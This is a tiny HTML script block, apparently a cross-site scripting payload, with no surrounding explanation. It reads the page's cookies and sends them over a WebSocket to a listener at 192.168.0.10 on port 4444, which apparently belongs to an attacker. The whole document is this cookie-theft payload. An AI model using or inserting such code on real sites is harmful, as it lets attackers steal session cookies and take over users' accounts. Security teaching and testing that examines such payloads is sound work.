<script>
	var cookie = document.cookie;
	var connection = new WebSocket('ws://192.168.0.10:4444');
	connection.send(cookie);
	connection.onopen = function() {
		connection.send(cookie);
	};
</script>

